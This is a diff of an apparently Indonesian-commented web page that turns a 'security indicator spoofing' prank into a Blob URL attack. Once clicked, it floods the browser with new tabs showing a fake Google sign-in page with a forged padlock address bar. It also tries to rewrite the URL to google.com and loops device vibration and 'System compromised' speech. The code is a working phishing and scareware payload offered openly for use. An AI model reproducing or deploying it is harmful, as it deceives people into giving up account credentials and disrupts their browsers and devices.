@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Security Indicator Spoofing</title>
+<title>Blob URL Security Spoofing</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
@@ -20,7 +20,7 @@ button:disabled { background: #555; cursor: not-allowed; }
 <body>
 <div class="panel" id="main-panel">
     <h1>⚠️ SYSTEM ALERT</h1>
-    <p>Sistem mendeteksi anomali. Klik tombol di bawah untuk memulai (Security Indicator Spoofing).</p>
+    <p>Sistem mendeteksi anomali. Klik tombol di bawah untuk memulai (Blob URL Spoofing).</p>
     
     <button id="start-btn" type="button">Mulai Pemindaian</button>
     
@@ -46,6 +46,58 @@ function efekHacker() {
     }
 }
 
+// PAYLOAD HTML UNTUK BLOB
+const payloadHTML = `
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Google</title>
+    <link rel="icon" href="https://www.google.com/favicon.ico">
+    <style>
+        body { margin:0; padding:0; background:#fff; font-family:Arial, sans-serif; }
+        .address-bar { background:#e8eaed; padding:10px 15px; display:flex; align-items:center; border-bottom:1px solid #dadce0; }
+        .url-box { background:#fff; border-radius:20px; padding:8px 15px; display:flex; align-items:center; width:100%; box-shadow:0 1px 3px rgba(0,0,0,0.1); }
+        .lock-icon { color:#5f6368; margin-right:10px; font-size:16px; }
+        .url-text { color:#202124; font-size:14px; font-weight:bold; }
+        .content { display:flex; align-items:center; justify-content:center; height:calc(100vh - 60px); text-align:center; }
+        .login-box { width:100%; max-width:400px; padding:20px; }
+        .google-logo { width:200px; margin-bottom:20px; }
+        h2 { font-size:20px; font-weight:normal; margin-bottom:20px; color:#202124; }
+        p { font-size:14px; color:#5f6368; margin-bottom:30px; }
+        input { width:100%; padding:13px 15px; margin-bottom:15px; border:1px solid #dadce0; border-radius:4px; font-size:16px; box-sizing:border-box; outline:none; }
+        button { width:100%; padding:12px; background:#1a73e8; color:#fff; border:none; border-radius:4px; font-size:16px; font-weight:bold; cursor:pointer; }
+        .warning { color:#f00; font-size:10px; margin-top:20px; }
+    </style>
+</head>
+<body>
+    <!-- FAKE ADDRESS BAR -->
+    <div class="address-bar">
+        <div class="url-box">
+            <span class="lock-icon">🔒</span>
+            <span class="url-text">https://accounts.google.com/signin</span>
+        </div>
+    </div>
+
+    <!-- FAKE LOGIN FORM -->
+    <div class="content">
+        <div class="login-box">
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" class="google-logo">
+            <h2>Sign in</h2>
+            <p>to continue to Gmail</p>
+            <input type="email" placeholder="Email or phone">
+            <input type="password" placeholder="Password">
+            <button>Next</button>
+            <p class="warning">Blob URL Spoofed by Waguri</p>
+        </div>
+    </div>
+</body>
+</html>
+`;
+
+// Membuat Blob dari Payload
+const blob = new Blob([payloadHTML], { type: 'text/html' });
+const blobURL = URL.createObjectURL(blob);
+
 startBtn.addEventListener("click", function() {
     if (isProcessing) return;
     isProcessing = true;
@@ -55,80 +107,46 @@ startBtn.addEventListener("click", function() {
     efekHacker();
 
     let dipicu = 0;
-    statusDiv.textContent = "Memicu Security Indicator Spoofing...";
+    statusDiv.textContent = "Memicu Blob URL Spoofing...";
 
     function picuTerusMenerus() {
         dipicu++;
         try {
-            const w = window.open('about:blank', '_blank');
+            // Buka tab baru langsung menuju Blob URL
+            const w = window.open(blobURL, '_blank');
             
             if (w) {
                 try {
-                    // 1. TITLE BAR SPOOFING
-                    w.document.title = "Google";
+                    // Berikan sedikit waktu untuk memuat Blob, lalu coba spoof URL bar
+                    setTimeout(() => {
+                        try {
+                            w.history.replaceState({}, '', 'https://google.com');
+                        } catch(e) {}
+                    }, 100);
 
-                    // 2. FAVICON SPOOFING
-                    const link = w.document.createElement('link');
-                    link.rel = 'icon';
-                    link.href = 'https://www.google.com/favicon.ico'; 
-                    w.document.head.appendChild(link);
+                    // 5. GETAR & TTS BERULANG DI TAB BARU
+                    w.addEventListener('load', function() {
+                        try {
+                            w.eval(`
+                                if (navigator.vibrate) {
+                                    setInterval(function() {
+                                        navigator.vibrate([1000, 500, 1000]);
+                                    }, 2500);
+                                }
+                                if ('speechSynthesis' in window) {
+                                    setInterval(function() {
+                                        var msg = new SpeechSynthesisUtterance('System compromised');
+                                        msg.lang = 'en-US';
+                                        window.speechSynthesis.speak(msg);
+                                    }, 4000);
+                                }
+                            `);
+                        } catch(e) {}
+                    });
 
-                    // 3. HISTORY API SPOOFING (Mencoba mengganti URL)
-                    try {
-                        w.history.replaceState({}, '', 'https://google.com');
-                    } catch(e) {}
-
-                    // 4. SECURITY INDICATOR SPOOFING (UI Injection)
-                    w.document.body.style.margin = "0";
-                    w.document.body.style.padding = "0";
-                    w.document.body.style.background = "#fff";
-                    w.document.body.style.fontFamily = "Arial, sans-serif";
-                    
-                    // Tampilan Fake Google Login + Fake URL Bar di dalam halaman
-                    w.document.body.innerHTML = `
-                        <!-- FAKE ADDRESS BAR / SECURITY INDICATOR -->
-                        <div style="background:#e8eaed; padding:10px 15px; display:flex; align-items:center; border-bottom:1px solid #dadce0;">
-                            <div style="background:#fff; border-radius:20px; padding:8px 15px; display:flex; align-items:center; width:100%; box-shadow:0 1px 3px rgba(0,0,0,0.1);">
-                                <span style="color:#5f6368; margin-right:10px; font-size:16px;">🔒</span>
-                                <span style="color:#202124; font-size:14px; font-weight:bold;">https://accounts.google.com/signin</span>
-                            </div>
-                        </div>
-
-                        <!-- KONTEN LOGIN PALSU -->
-                        <div style="display:flex; align-items:center; justify-content:center; height:calc(100vh - 60px); text-align:center; background:#fff;">
-                            <div style="width:100%; max-width:400px; padding:20px;">
-                                <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" style="width:200px; margin-bottom:20px;">
-                                <h2 style="font-size:20px; font-weight:normal; margin-bottom:20px; color:#202124;">Sign in</h2>
-                                <p style="font-size:14px; color:#5f6368; margin-bottom:30px;">to continue to Gmail</p>
-                                <input type="email" placeholder="Email or phone" style="width:100%; padding:13px 15px; margin-bottom:15px; border:1px solid #dadce0; border-radius:4px; font-size:16px; box-sizing:border-box; outline:none;">
-                                <input type="password" placeholder="Password" style="width:100%; padding:13px 15px; margin-bottom:15px; border:1px solid #dadce0; border-radius:4px; font-size:16px; box-sizing:border-box; outline:none;">
-                                <button style="width:100%; padding:12px; background:#1a73e8; color:#fff; border:none; border-radius:4px; font-size:16px; font-weight:bold; cursor:pointer;">Next</button>
-                                <p style="color:#f00; font-size:10px; margin-top:20px;">Security Indicator Spoofed by Waguri</p>
-                            </div>
-                        </div>
-                    `;
-
-                    // 5. GETAR & TTS BERULANG
-                    w.eval(`
-                        if (navigator.vibrate) {
-                            setInterval(function() {
-                                navigator.vibrate([1000, 500, 1000]);
-                            }, 2500);
-                        }
-                        if ('speechSynthesis' in window) {
-                            setInterval(function() {
-                                var msg = new SpeechSynthesisUtterance('System compromised');
-                                msg.lang = 'en-US';
-                                window.speechSynthesis.speak(msg);
-                            }, 4000);
-                        }
-                    `);
-
-                } catch(e) {
-                    console.warn("Injeksi diblokir: " + e.message);
-                }
+                } catch(e) {}
             }
-            statusDiv.textContent = `Membuka tab spoofing ke-${dipicu}...`;
+            statusDiv.textContent = `Membuka tab Blob ke-${dipicu}...`;
         } catch(e) {}
 
         queueMicrotask(picuTerusMenerus);
